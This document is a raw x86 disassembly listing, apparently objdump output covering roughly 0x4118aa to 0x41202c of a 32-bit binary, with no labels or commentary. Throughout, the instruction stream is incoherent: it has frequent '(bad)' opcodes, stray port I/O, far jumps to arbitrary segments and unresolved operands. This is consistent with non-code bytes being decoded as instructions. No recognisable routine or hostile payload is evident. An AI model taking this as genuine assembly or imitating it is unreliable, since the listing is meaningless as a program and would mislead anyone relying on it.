  4118aa:	or     DWORD PTR [ebx],edi
  4118ac:	std    
  4118ad:	aas    
  4118ae:	inc    esp
  4118af:	pop    esp
  4118b0:	nop
  4118b1:	inc    eax
  4118b2:	rcl    ebp,cl
  4118b4:	xchg   ebp,eax
  4118b5:	lock mov ebp,0x87b2e0f1
  4118bb:	xor    eax,0xef65680e
  4118c0:	pop    edi
  4118c1:	pop    edx
  4118c2:	inc    edx
  4118c3:	mov    bl,0xf0
  4118c5:	mov    dh,0x3
  4118c7:	lods   eax,DWORD PTR ds:[esi]
  4118c8:	mov    ds:0x9586696a,eax
  4118cd:	mov    ?,WORD PTR [esp-0x1d]
  4118d1:	sub    al,0xe2
  4118d3:	outs   dx,DWORD PTR ds:[esi]
  4118d4:	sub    BYTE PTR [eax+0x70],dh
  4118d7:	out    dx,eax
  4118d8:	rcl    BYTE PTR [edi-0x593dde2e],1
  4118de:	adc    edi,ebp
  4118e0:	ins    DWORD PTR es:[edi],dx
  4118e1:	call   0x3d0f:0x97452fa5
  4118e8:	xor    bl,BYTE PTR [edx]
  4118ea:	in     eax,dx
  4118eb:	scas   eax,DWORD PTR es:[edi]
  4118ec:	mov    bh,0x62
  4118ee:	fmul   QWORD PTR [ebx]
  4118f0:	lock push edx
  4118f2:	(bad)  
  4118f3:	in     al,0xcb
  4118f5:	frstor [ebp+0x49d9f1e]
  4118fb:	stos   DWORD PTR es:[edi],eax
  4118fc:	add    al,0x4e
  4118fe:	inc    ebx
  4118ff:	or     cl,BYTE PTR [edi+0x1cb51e91]
  411905:	cs xchg esi,eax
  411907:	push   ds
  411908:	gs push ebp
  41190a:	adc    DWORD PTR [edx+0x73edd7a7],esp
  411910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411911:	cmp    BYTE PTR ss:[ecx+0x6f],dl
  411915:	out    0x2d,eax
  411917:	mov    DWORD PTR [edi+esi*8],ecx
  41191a:	sbb    BYTE PTR ds:0x763c0c72,dh
  411920:	push   ebp
  411921:	and    eax,0x77d9dd01
  411926:	or     ebp,esp
  411928:	in     eax,0xe7
  41192a:	fld    QWORD PTR [edx]
  41192c:	mov    dh,0xdc
  41192e:	xor    DWORD PTR [edx],edi
  411930:	(bad)  
  411932:	push   ds
  411933:	mov    ebx,0x662cdc03
  411938:	jns    0x4118ba
  41193a:	mov    ah,0x7c
  41193c:	sub    ebx,DWORD PTR [ebp-0x6d]
  41193f:	ins    DWORD PTR es:[edi],dx
  411940:	and    BYTE PTR [edx+0x72],cl
  411943:	jmp    0xce082639
  411948:	push   0x30e4552c
  41194d:	inc    edi
  41194e:	and    edi,DWORD PTR [edi-0xadb1430]
  411954:	cs jno 0x411924
  411957:	das    
  411958:	sbb    BYTE PTR [ebx],ch
  41195a:	int    0xa3
  41195c:	push   ds
  41195d:	ret    
  41195e:	in     eax,dx
  41195f:	inc    esi
  411960:	in     eax,dx
  411961:	rol    BYTE PTR [eax+0x4310000d],0x1b
  411968:	add    edi,DWORD PTR [ecx]
  41196a:	mov    ds:0xa658a2a8,al
  41196f:	xor    BYTE PTR [ecx+0x667580d3],bl
  411975:	mov    bh,0xa6
  411977:	mov    bl,BYTE PTR [edi+ebp*8-0x2f950925]
  41197e:	rol    ch,cl
  411980:	mov    ch,BYTE PTR [ecx+0x62ca4048]
  411986:	cdq    
  411987:	mov    ebp,0x48084db4
  41198c:	pop    eax
  41198d:	mov    gs,WORD PTR [esi]
  41198f:	xchg   ebx,eax
  411990:	inc    edi
  411991:	leave  
  411992:	sbb    al,0x3b
  411994:	mov    cl,0xc9
  411996:	jp     0x411968
  411998:	cli    
  411999:	sub    ecx,esi
  41199b:	add    ecx,DWORD PTR [ebx+ecx*8]
  41199e:	adc    BYTE PTR [edx],dh
  4119a0:	dec    ebp
  4119a1:	scas   al,BYTE PTR es:[edi]
  4119a2:	mov    bh,dl
  4119a4:	mov    ds:0xfcd41802,al
  4119a9:	mov    dh,ch
  4119ab:	push   ebx
  4119ac:	mov    ch,0x30
  4119ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119af:	rol    DWORD PTR [edi],1
  4119b1:	mov    ecx,0x11b5ccbf
  4119b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119b7:	mov    ebp,0x5527b601
  4119bc:	stos   BYTE PTR es:[edi],al
  4119bd:	(bad)  
  4119be:	(bad)  
  4119c0:	inc    ecx
  4119c1:	mov    ?,WORD PTR [eax]
  4119c3:	fsubr  st,st(7)
  4119c5:	shr    DWORD PTR [ecx],cl
  4119c7:	retf   0x76d
  4119ca:	jae    0x4119ec
  4119cc:	dec    eax
  4119cd:	shl    DWORD PTR ds:0x6109f78,cl
  4119d3:	push   es
  4119d4:	inc    ecx
  4119d5:	mov    ds:0x578a27df,eax
  4119da:	nop
  4119db:	jnp    0x411985
  4119dd:	push   0xffffff83
  4119df:	add    al,0xcc
  4119e1:	jae    0x411a03
  4119e3:	test   BYTE PTR [eax-0x5a86cfc7],dl
  4119e9:	mov    ds:0x208f0b57,eax
  4119ee:	cmp    dl,BYTE PTR [edx+0x22]
  4119f1:	adc    DWORD PTR [esi+0x78],ebx
  4119f4:	(bad)  
  4119f5:	dec    BYTE PTR [edi]
  4119f7:	cmp    ebx,DWORD PTR [ebx-0xb02dfa9]
  4119fd:	bnd jmp 0x411a51
  411a00:	outs   dx,BYTE PTR ds:[esi]
  411a01:	loop   0x4119f5
  411a03:	add    ah,BYTE PTR [esi+ecx*2]
  411a06:	adc    ecx,eax
  411a08:	sub    DWORD PTR [eax+0x7141517b],ebp
  411a0e:	adc    DWORD PTR [ebp+0x10ace517],edi
  411a14:	cs sub ecx,esi
  411a17:	mov    ebp,0xef89f2f1
  411a1c:	or     eax,0xf34e0944
  411a21:	imul   ebp,DWORD PTR [esi],0x23bebae4
  411a27:	mov    ecx,0xba2ff631
  411a2c:	and    BYTE PTR [esi+0x17480dbc],0x83
  411a33:	jl     0x4119da
  411a35:	mov    ds:0xcc97d8,al
  411a3a:	adc    esi,DWORD PTR [eax+0x543e2e35]
  411a40:	mov    eax,ds:0x4a1609e0
  411a45:	adc    eax,0x842c7b26
  411a4a:	push   edx
  411a4b:	or     al,0xaa
  411a4d:	mov    ch,0xf8
  411a4f:	cmp    eax,0x837116df
  411a54:	or     al,0x6e
  411a56:	in     eax,0xb3
  411a58:	aam    0x52
  411a5a:	pop    ecx
  411a5b:	sbb    al,0x61
  411a5d:	adc    eax,0x8657f86
  411a62:	mov    ecx,0x287e8f32
  411a67:	xor    eax,0x66c4e31c
  411a6c:	adc    al,0xab
  411a6e:	push   esi
  411a6f:	fild   WORD PTR es:[esi]
  411a72:	sub    BYTE PTR [edi+0x79],bl
  411a75:	push   0x58
  411a77:	je     0x411adb
  411a79:	lods   eax,DWORD PTR ds:[esi]
  411a7a:	mov    ebx,0xac89ce83
  411a7f:	adc    al,0x33
  411a81:	inc    eax
  411a82:	mov    bl,0x5e
  411a84:	mov    ds,WORD PTR [ebx+0x7015175c]
  411a8a:	aad    0x34
  411a8c:	int3   
  411a8d:	xchg   esp,eax
  411a8e:	fwait
  411a8f:	xchg   esp,eax
  411a90:	aaa    
  411a91:	push   0x5cd97286
  411a96:	add    al,0xa8
  411a98:	push   es
  411a99:	outs   dx,DWORD PTR ds:[esi]
  411a9a:	adc    al,0x7d
  411a9c:	lea    ecx,[edi+0x1c]
  411a9f:	adc    edx,ebp
  411aa1:	mov    ah,0xd6
  411aa3:	sbb    eax,0xf74a60ff
  411aa8:	lahf   
  411aa9:	cdq    
  411aaa:	cmc    
  411aab:	cmp    al,0xeb
  411aad:	jp     0x411a67
  411aaf:	xor    edi,DWORD PTR [edi]
  411ab1:	mov    bh,0xb3
  411ab3:	inc    ebx
  411ab4:	test   BYTE PTR [ebx],dh
  411ab6:	xchg   ebp,eax
  411ab7:	xchg   ebp,eax
  411ab8:	cmc    
  411ab9:	std    
  411aba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411abb:	push   cs
  411abc:	out    dx,eax
  411abd:	lock arpl WORD PTR [edi+0x48],bx
  411ac1:	xor    BYTE PTR [eax-0x51],dh
  411ac4:	xor    al,0x3d
  411ac6:	push   esp
  411ac7:	push   ebp
  411ac8:	mov    ah,cl
  411aca:	adc    ebp,DWORD PTR [eax-0xa]
  411acd:	iret   
  411ace:	not    BYTE PTR [edi-0x783525df]
  411ad4:	cs js  0x411b3a
  411ad7:	jnp    0x411b06
  411ad9:	daa    
  411ada:	adc    BYTE PTR [edx-0x7],ch
  411add:	ins    DWORD PTR es:[edi],dx
  411ade:	and    BYTE PTR [esi-0x27],0x6
  411ae2:	sub    ah,BYTE PTR [ebx]
  411ae4:	(bad)  
  411ae5:	(bad)  [edx]
  411ae7:	pop    esp
  411ae8:	pop    esp
  411ae9:	enter  0x98ef,0x20
  411aed:	adc    ch,BYTE PTR [ecx]
  411aef:	scas   al,BYTE PTR es:[edi]
  411af0:	dec    edx
  411af1:	das    
  411af2:	aaa    
  411af3:	out    0x73,al
  411af5:	add    DWORD PTR [esi],edx
  411af7:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411af9:	and    esp,esi
  411afb:	cld    
  411afc:	call   0x3a0c2390
  411b01:	test   BYTE PTR [ecx-0x2f418eb0],0xd9
  411b08:	adc    al,0xd7
  411b0a:	push   ds
  411b0b:	fwait
  411b0c:	int    0x95
  411b0e:	dec    esi
  411b0f:	dec    ebx
  411b10:	sub    BYTE PTR [esi+0x53],ch
  411b13:	and    edi,DWORD PTR [ebp+0x4307b14f]
  411b19:	mov    dh,0x7
  411b1b:	mov    eax,ds:0x235a89a5
  411b20:	lds    edx,FWORD PTR [esi+0x4e6dd8e1]
  411b26:	push   ebp
  411b27:	pop    eax
  411b28:	dec    ecx
  411b29:	loope  0x411b9d
  411b2b:	mov    ds:0xd1900b81,eax
  411b30:	(bad)  
  411b31:	jmp    0x71591128
  411b36:	sub    ebx,DWORD PTR [ebx-0x5a]
  411b39:	xchg   edx,eax
  411b3a:	inc    edi
  411b3b:	inc    ebx
  411b3c:	(bad)  
  411b3d:	jmp    0x4fc3:0x71bed135
  411b44:	mov    ah,0xbe
  411b46:	fmul   QWORD PTR [eax+0x42]
  411b49:	fiadd  DWORD PTR [ecx+0x7e66f112]
  411b4f:	cmp    BYTE PTR [ebx+0x52],cl
  411b52:	fidiv  DWORD PTR [edx+0x43]
  411b55:	mov    bl,0x17
  411b57:	push   edx
  411b58:	and    eax,0xfbcb1d71
  411b5d:	push   0x55
  411b5f:	repnz mov eax,ds:0xddcaf233
  411b65:	cdq    
  411b66:	jg     0x411b68
  411b68:	sub    al,0x39
  411b6a:	into   
  411b6b:	push   DWORD PTR ds:0xf86002fd
  411b71:	xor    DWORD PTR [eax],esi
  411b73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b74:	xchg   edx,eax
  411b75:	push   ds
  411b76:	cmp    al,0x9
  411b78:	inc    DWORD PTR [eax-0x7a246498]
  411b7e:	sub    DWORD PTR [edi+ebx*1+0x929591],esp
  411b85:	cli    
  411b86:	push   cs
  411b87:	push   ecx
  411b88:	and    BYTE PTR fs:[edx-0x27],ah
  411b8c:	sub    DWORD PTR [eax+0x57],edi
  411b8f:	add    esp,edx
  411b91:	(bad)  
  411b93:	into   
  411b94:	pop    esp
  411b95:	addr16 pop ecx
  411b97:	fsubr  QWORD PTR ds:0xba7513f7
  411b9d:	push   esp
  411b9e:	inc    ecx
  411b9f:	add    eax,0x62ffc848
  411ba4:	out    0xa7,al
  411ba6:	adc    ebp,DWORD PTR ds:0x671c9690
  411bac:	pop    eax
  411bad:	xor    esp,DWORD PTR [eax+0x62770bf5]
  411bb3:	lds    esp,FWORD PTR [esi]
  411bb5:	dec    edx
  411bb6:	cmc    
  411bb7:	sbb    DWORD PTR [edi-0x60b27879],edx
  411bbd:	xor    DWORD PTR [esi],edx
  411bbf:	je     0x411bef
  411bc1:	jns    0x411bb2
  411bc3:	xchg   DWORD PTR [ecx+ebx*4+0x7a578d22],ebp
  411bca:	icebp  
  411bcb:	out    0xb2,eax
  411bcd:	ret    0x7118
  411bd0:	jbe    0x411b69
  411bd2:	lock out 0x81,al
  411bd5:	jbe    0x411bf2
  411bd7:	push   eax
  411bd8:	and    BYTE PTR [ebp-0x31893803],0x85
  411bdf:	sub    DWORD PTR [edi+0x16],eax
  411be2:	cmp    ah,BYTE PTR [ebx+0x7610fc04]
  411be8:	pop    ebp
  411be9:	xor    eax,0xa445edc4
  411bee:	aam    0x42
  411bf0:	xor    BYTE PTR [edi-0x31],bl
  411bf3:	sub    BYTE PTR [esi-0x3d],ah
  411bf6:	lods   al,BYTE PTR ds:[esi]
  411bf7:	pop    ebp
  411bf8:	fwait
  411bf9:	outs   dx,DWORD PTR ds:[esi]
  411bfa:	pop    edx
  411bfb:	leave  
  411bfc:	sbb    eax,0x9892ff36
  411c01:	xchg   edi,eax
  411c02:	xor    BYTE PTR [ebx+0x7b482983],dl
  411c08:	in     eax,dx
  411c09:	or     DWORD PTR [ebp+0x1b],edi
  411c0c:	popf   
  411c0d:	aad    0x41
  411c0f:	in     al,dx
  411c10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c11:	pop    ecx
  411c12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c13:	push   ss
  411c14:	jno    0x411c5b
  411c16:	mov    eax,0xe2e34cfa
  411c1b:	jb     0x411bc2
  411c1d:	adc    ebx,DWORD PTR [ebp+0x22b76b8f]
  411c23:	cmp    esi,DWORD PTR [ebx-0x7c]
  411c26:	ins    DWORD PTR es:[edi],dx
  411c27:	clc    
  411c28:	enter  0x6eac,0xc
  411c2c:	or     BYTE PTR [edx],bh
  411c2e:	xchg   esi,eax
  411c2f:	or     ch,BYTE PTR [edi+0x6a]
  411c32:	xchg   ebx,eax
  411c33:	xlat   BYTE PTR ds:[ebx]
  411c34:	jmp    0x8076:0x2f805209
  411c3b:	pop    eax
  411c3c:	(bad)  
  411c3d:	mov    ?,WORD PTR [ebx+0x7b501f43]
  411c43:	(bad)  
  411c44:	pop    ebx
  411c45:	leave  
  411c46:	mov    DWORD PTR [esi+esi*2+0x28],edi
  411c4a:	inc    esp
  411c4b:	jmp    DWORD PTR [edi]
  411c4d:	mov    al,ds:0x62d0afd4
  411c52:	push   ss
  411c53:	hlt    
  411c54:	lea    ecx,[eax+0x1d0cb384]
  411c5a:	arpl   WORD PTR [ebx+0xb],si
  411c5d:	outs   dx,DWORD PTR ds:[esi]
  411c5e:	(bad)  
  411c5f:	enter  0xc2fe,0x51
  411c63:	mov    ds:0xf293965b,eax
  411c68:	sbb    BYTE PTR [ecx],0x1c
  411c6b:	iret   
  411c6c:	bound  ecx,QWORD PTR [ecx]
  411c6e:	push   eax
  411c6f:	fst    st(7)
  411c71:	mov    bh,0x2
  411c73:	stos   BYTE PTR es:[edi],al
  411c74:	add    DWORD PTR [ecx],eax
  411c76:	jb     0x411bfc
  411c78:	pop    edx
  411c79:	in     al,0xa1
  411c7b:	add    DWORD PTR [eax+0x2],edx
  411c7e:	cli    
  411c7f:	sub    DWORD PTR [ebx],ebp
  411c81:	adc    DWORD PTR [eax+0x22],edi
  411c84:	outs   dx,BYTE PTR ds:[esi]
  411c85:	xchg   esi,eax
  411c86:	daa    
  411c87:	or     eax,0x57e183f8
  411c8c:	lock sub BYTE PTR ds:0xa98fae38,cl
  411c93:	in     eax,0xc6
  411c95:	mov    es,WORD PTR [esi+0x55]
  411c98:	aaa    
  411c99:	pop    esi
  411c9a:	daa    
  411c9b:	pop    ss
  411c9c:	aaa    
  411c9d:	inc    ecx
  411c9e:	cdq    
  411c9f:	push   edx
  411ca0:	stos   DWORD PTR es:[edi],eax
  411ca1:	mov    ah,0x59
  411ca3:	ss ret 0x2a0
  411ca7:	repnz add al,0xf0
  411caa:	dec    esi
  411cab:	sahf   
  411cac:	jb     0x411d13
  411cae:	stos   DWORD PTR es:[edi],eax
  411caf:	xor    edx,DWORD PTR [esi-0x11]
  411cb2:	xchg   ebp,eax
  411cb3:	jp     0x411ce0
  411cb5:	je     0x411c8c
  411cb7:	pop    eax
  411cb8:	push   esp
  411cb9:	clc    
  411cba:	in     eax,dx
  411cbb:	imul   ebp,esi,0xffffffe9
  411cbe:	rol    DWORD PTR [ebx-0x9],cl
  411cc1:	inc    esi
  411cc2:	cwde   
  411cc3:	sti    
  411cc4:	js     0x411c7f
  411cc6:	sbb    al,0xdd
  411cc8:	lods   eax,DWORD PTR ds:[esi]
  411cc9:	inc    esi
  411cca:	pop    ss
  411ccb:	push   esp
  411ccc:	sub    eax,0x653784f9
  411cd1:	sub    ecx,DWORD PTR [esi+0x10]
  411cd4:	(bad)  
  411cd5:	mov    DWORD PTR [edx+0x4f57dc45],esi
  411cdb:	mov    ds:0xe65657de,eax
  411ce0:	lock sti 
  411ce2:	add    BYTE PTR [ebp-0x160108a7],0x21
  411ce9:	call   0x19c1:0x12aa2d45
  411cf0:	jg     0x411d49
  411cf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cf3:	jmp    0x411d74
  411cf5:	(bad)  
  411cf6:	lds    ebp,FWORD PTR [edx]
  411cf8:	dec    esp
  411cf9:	xor    esp,DWORD PTR [edx+0x37]
  411cfc:	lods   al,BYTE PTR ds:[esi]
  411cfd:	mov    ah,BYTE PTR [ebp+0x374e296d]
  411d03:	out    0x23,eax
  411d05:	js     0x411d03
  411d07:	pushf  
  411d08:	sti    
  411d09:	imul   edx,ebp,0x64
  411d0c:	and    edi,eax
  411d0e:	xlat   BYTE PTR ds:[ebx]
  411d0f:	rcr    BYTE PTR [eax*4+0x33e5ec53],0xf3
  411d17:	ds mov eax,0x4e4330a
  411d1d:	mov    WORD PTR [esi-0x4d],ds
  411d20:	mov    bl,ch
  411d22:	pop    es
  411d23:	xor    ch,BYTE PTR [ebx-0x39]
  411d26:	outs   dx,DWORD PTR ds:[esi]
  411d27:	adc    BYTE PTR [eax-0x28],cl
  411d2a:	les    ecx,FWORD PTR gs:[edx+0x45]
  411d2e:	add    al,0xd6
  411d30:	aaa    
  411d31:	jmp    0x411cb3
  411d33:	and    ebp,esp
  411d35:	jae    0x411d1b
  411d37:	fwait
  411d38:	xchg   edi,eax
  411d39:	mov    ds:0x55214d81,al
  411d3e:	(bad)  
  411d3f:	cmc    
  411d40:	or     al,0xd9
  411d42:	bound  edi,QWORD PTR [ebx-0x1a]
  411d45:	pop    esp
  411d46:	inc    esp
  411d47:	scas   eax,DWORD PTR es:[edi]
  411d48:	xor    eax,0x972f65f5
  411d4d:	or     BYTE PTR [esi+ebp*4],0x97
  411d51:	popf   
  411d52:	bnd jl 0x411d83
  411d55:	pop    DWORD PTR [edx-0x786bfc23]
  411d5b:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  411d5d:	pop    es
  411d5e:	xor    ecx,DWORD PTR cs:[ebp+0x589c3054]
  411d65:	sub    ah,BYTE PTR [ebp+edi*2-0x6a4fd22c]
  411d6c:	push   ebx
  411d6d:	xlat   BYTE PTR ds:[ebx]
  411d6e:	pop    ecx
  411d6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d70:	jmp    0x411d7b
  411d72:	stos   DWORD PTR es:[edi],eax
  411d73:	mov    ecx,0x41f2f7f6
  411d78:	sar    BYTE PTR [ecx+edi*8+0x3c],cl
  411d7c:	repz and dh,BYTE PTR [ebx-0x254cffd5]
  411d83:	dec    esp
  411d84:	hlt    
  411d85:	pop    edx
  411d86:	out    0x92,al
  411d88:	lds    edx,FWORD PTR [esi+0x407e81f5]
  411d8e:	xchg   BYTE PTR [edx-0x1b],ah
  411d91:	data16 retfw 0xd518
  411d96:	dec    ebx
  411d97:	lgs    ecx,FWORD PTR cs:[esi-0x3b276343]
  411d9f:	out    dx,al
  411da0:	rcr    DWORD PTR [edi-0x37315799],1
  411da6:	cmp    eax,0x83bfa849
  411dab:	or     BYTE PTR [eax-0x1a],0x1a
  411daf:	xchg   dl,bh
  411db1:	mov    ch,0x22
  411db3:	xor    al,0xeb
  411db5:	inc    edi
  411db6:	or     eax,0x95ca1409
  411dbb:	(bad)  
  411dbc:	and    DWORD PTR [esi+edx*1+0x1c],ebp
  411dc0:	mov    BYTE PTR [ebx+0x20175c9b],dh
  411dc6:	pop    eax
  411dc7:	jmp    0x65b:0xdf65d2f1
  411dce:	mov    al,ds:0xb574c8bb
  411dd3:	mov    ds:0x1bd2ce80,al
  411dd8:	adc    dh,BYTE PTR [edi+0x7d0763b0]
  411dde:	ror    ch,0x75
  411de1:	(bad)  
  411de2:	mov    al,0x76
  411de4:	mov    ch,0x25
  411de6:	pop    edx
  411de7:	add    DWORD PTR [ebp+0x43b468b],edx
  411ded:	ja     0x411dec
  411def:	or     al,0x6b
  411df1:	add    BYTE PTR [ebx+0x1203cc5c],dh
  411df7:	mov    dl,0xd9
  411df9:	cli    
  411dfa:	xchg   ecx,eax
  411dfb:	cmp    al,0x27
  411dfd:	outs   dx,DWORD PTR ds:[esi]
  411dfe:	ins    BYTE PTR es:[edi],dx
  411dff:	rol    al,1
  411e01:	xlat   BYTE PTR ds:[ebx]
  411e02:	jge    0x411e30
  411e04:	pop    ecx
  411e05:	and    DWORD PTR [ebx],esp
  411e07:	jne    0x411dce
  411e09:	mov    esp,0x2f483696
  411e0e:	sub    DWORD PTR ds:[esi],esi
  411e11:	sub    ah,BYTE PTR [ecx+0x53]
  411e14:	push   es
  411e15:	into   
  411e16:	pop    ss
  411e17:	xchg   ebp,eax
  411e18:	dec    ebx
  411e19:	addr16 loop 0x411e5a
  411e1c:	sub    eax,0xa303552a
  411e21:	mov    dl,0xa1
  411e23:	adc    ecx,DWORD PTR [eax+0x41c56ad4]
  411e29:	mov    ah,0x91
  411e2b:	retf   0xc0e4
  411e2e:	jmp    0x2013:0x7d74f0ed
  411e35:	mov    al,0xd0
  411e37:	aas    
  411e38:	sbb    edi,ebx
  411e3a:	mov    BYTE PTR [ebp+0x72],ah
  411e3d:	xor    eax,0xdd05ad61
  411e42:	xor    DWORD PTR [ebx+0xbd0c477],ecx
  411e48:	and    BYTE PTR [ecx],0x3
  411e4b:	push   ebp
  411e4c:	sbb    cl,BYTE PTR [edi]
  411e4e:	ret    0x9296
  411e51:	mov    al,ds:0x9e98e02d
  411e56:	push   edi
  411e57:	addr16 loope 0x411e7c
  411e5a:	(bad)  [ebp+0x43219a5a]
  411e60:	push   cs
  411e61:	ja     0x411de6
  411e63:	push   eax
  411e64:	in     al,dx
  411e65:	jne    0x411e75
  411e67:	outs   dx,DWORD PTR ds:[esi]
  411e68:	gs loope 0x411e85
  411e6b:	push   0x75
  411e6d:	adc    cl,cl
  411e6f:	leave  
  411e70:	cmc    
  411e71:	dec    eax
  411e72:	ds out dx,eax
  411e74:	test   eax,0xf2bf1451
  411e79:	mov    gs,WORD PTR [edi+0x24feae52]
  411e7f:	test   BYTE PTR [edi-0x1e],0xf1
  411e83:	push   ebx
  411e84:	sub    al,0xde
  411e86:	loop   0x411e2b
  411e88:	mov    edx,0xef9a8c3
  411e8d:	repz cmp esi,DWORD PTR [eax-0x33d3fd2d]
  411e94:	imul   eax,ebp,0xffffff9a
  411e97:	xor    eax,0xe6ddeb6f
  411e9c:	icebp  
  411e9d:	mov    WORD PTR [eax],ss
  411e9f:	dec    esi
  411ea0:	stos   BYTE PTR es:[edi],al
  411ea1:	push   edi
  411ea2:	jne    0x411ef9
  411ea4:	sub    eax,0x160d4c05
  411ea9:	or     BYTE PTR [ecx-0x57],dl
  411eac:	inc    esi
  411ead:	pop    eax
  411eae:	or     ah,BYTE PTR [ecx]
  411eb0:	rol    BYTE PTR [ecx],0xca
  411eb3:	xor    DWORD PTR [ecx],edi
  411eb5:	(bad)  
  411eb6:	enter  0x8d07,0xd
  411eba:	sub    ebx,DWORD PTR [ebp-0x51]
  411ebd:	cmp    BYTE PTR [eax],ah
  411ebf:	out    dx,eax
  411ec0:	push   esp
  411ec1:	cli    
  411ec2:	adc    eax,0x9487a28
  411ec7:	in     al,0xbd
  411ec9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411eca:	data16 xor al,0xf
  411ecd:	push   0xffffff9b
  411ecf:	out    0x1b,eax
  411ed1:	push   ebp
  411ed2:	adc    al,BYTE PTR [ebx]
  411ed4:	pop    ebx
  411ed5:	daa    
  411ed6:	sahf   
  411ed7:	test   eax,0x142249f2
  411edc:	rol    BYTE PTR [edx-0x38],1
  411edf:	out    0x87,eax
  411ee1:	ins    BYTE PTR es:[edi],dx
  411ee2:	push   0xffffff8a
  411ee4:	xchg   ecx,eax
  411ee5:	(bad)  
  411ee6:	xchg   ebp,eax
  411ee7:	and    eax,0x54992159
  411eec:	sub    al,BYTE PTR [edx]
  411eee:	cmovge eax,DWORD PTR [ebx+0x29]
  411ef2:	dec    esi
  411ef3:	aad    0x63
  411ef5:	mov    esp,0x565380d8
  411efa:	pop    edx
  411efb:	mov    edx,DWORD PTR [edx+ecx*4-0x79]
  411eff:	dec    eax
  411f00:	(bad)  
  411f01:	pop    ebx
  411f02:	xor    BYTE PTR [edx+edx*2+0x50],cl
  411f06:	je     0x411f20
  411f08:	popf   
  411f09:	mov    WORD PTR [ebx-0x2a7649bc],ds
  411f0f:	push   es
  411f10:	in     eax,dx
  411f11:	jb     0x411ef3
  411f13:	fs shl eax,1
  411f16:	inc    ebp
  411f17:	cmp    eax,0x43834c89
  411f1c:	xchg   ebp,eax
  411f1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f1e:	pop    eax
  411f1f:	clc    
  411f20:	call   FWORD PTR [ecx]
  411f22:	cwde   
  411f23:	add    al,0x33
  411f25:	xor    al,0xe7
  411f27:	jmp    0xc96e:0x373c908e
  411f2e:	jno    0x411f36
  411f30:	lock adc ecx,DWORD PTR [edi-0x52]
  411f34:	std    
  411f35:	aam    0xd
  411f37:	(bad)  
  411f38:	push   cs
  411f39:	or     eax,0xe0f5bec2
  411f3e:	ror    DWORD PTR ds:0x6e9d197d,0x4d
  411f45:	inc    esp
  411f46:	pop    ss
  411f47:	data16 adc cl,BYTE PTR [esi-0x18]
  411f4b:	mov    bl,0xf7
  411f4d:	aad    0x21
  411f4f:	push   esi
  411f50:	mov    ds:0xeabb00f,eax
  411f55:	xor    DWORD PTR [ecx+0x39d6d8ae],esp
  411f5b:	pop    es
  411f5c:	(bad)  
  411f5d:	div    DWORD PTR [esi+edx*8-0x3d30fe5f]
  411f64:	dec    ebx
  411f65:	add    ah,0x81
  411f68:	cmp    DWORD PTR [ecx],ebx
  411f6a:	mov    ch,0xd7
  411f6c:	xchg   esi,eax
  411f6d:	in     al,dx
  411f6e:	xor    DWORD PTR [ebp+0x61],ebx
  411f71:	inc    ebp
  411f72:	add    edi,edi
  411f74:	inc    edi
  411f75:	fistp  WORD PTR [ebx+ecx*1-0x46240666]
  411f7c:	lds    ecx,FWORD PTR [edx+0x3088b9c]
  411f82:	out    dx,al
  411f83:	cwde   
  411f84:	or     cl,al
  411f86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f87:	dec    ebp
  411f88:	inc    eax
  411f89:	mov    ah,0x63
  411f8b:	pop    edi
  411f8c:	in     al,0x2d
  411f8e:	jbe    0x411f85
  411f90:	jne    0x411f3c
  411f92:	in     al,dx
  411f93:	cmp    al,0xa7
  411f95:	cwde   
  411f96:	out    0xfa,al
  411f98:	bound  ebx,QWORD PTR [ebx]
  411f9a:	stos   BYTE PTR es:[edi],al
  411f9b:	sbb    eax,0xed4376f8
  411fa0:	adc    ebp,DWORD PTR [ecx]
  411fa2:	push   es
  411fa3:	mov    ch,0x96
  411fa5:	xor    esp,esp
  411fa7:	xchg   ebx,eax
  411fa8:	retf   0xa51d
  411fab:	inc    esi
  411fac:	dec    edi
  411fad:	inc    edi
  411fae:	push   ss
  411faf:	add    ch,0x87
  411fb2:	cmp    BYTE PTR ds:0x7a812c4a,bh
  411fb8:	sub    edi,DWORD PTR [ebx+0x21a1f13c]
  411fbe:	jmp    FWORD PTR [eax+0x1b]
  411fc1:	sub    eax,0xac421283
  411fc6:	xchg   ecx,eax
  411fc7:	scas   al,BYTE PTR es:[edi]
  411fc8:	iret   
  411fc9:	in     eax,0x86
  411fcb:	xchg   DWORD PTR [edi-0x6022ebf9],eax
  411fd1:	ficom  WORD PTR [esi]
  411fd3:	out    dx,al
  411fd4:	and    cl,dh
  411fd6:	sar    BYTE PTR [edi-0x26e23727],1
  411fdc:	mov    ecx,0xdbc9364
  411fe1:	es out dx,al
  411fe3:	inc    ebp
  411fe4:	clc    
  411fe5:	sub    ebx,edi
  411fe7:	mov    ah,0x36
  411fe9:	fucomi st,st(3)
  411feb:	adc    bh,BYTE PTR [edi+esi*2-0x667fc42]
  411ff2:	mov    cl,0xc8
  411ff4:	dec    ebp
  411ff5:	mov    ds:0x44e285fa,eax
  411ffa:	push   esi
  411ffb:	xchg   BYTE PTR [esi-0x7293ecbf],bl
  412001:	or     DWORD PTR [eax+0xf44b5b4],esi
  412007:	es test eax,0x5b70dd14
  41200d:	xor    DWORD PTR [esi+0x15aa1cb3],esi
  412013:	lods   eax,DWORD PTR ds:[esi]
  412014:	pop    ecx
  412015:	push   eax
  412016:	adc    ebx,DWORD PTR [esi-0x1f51fac1]
  41201c:	retf   0x62c5
  41201f:	sub    al,0x4e
  412021:	lods   al,BYTE PTR ds:[esi]
  412022:	outs   dx,DWORD PTR ds:[esi]
  412023:	adc    bh,BYTE PTR [eax]
  412025:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412026:	push   edx
  412027:	mov    edx,0xe965997a
  41202c:	(bad)  
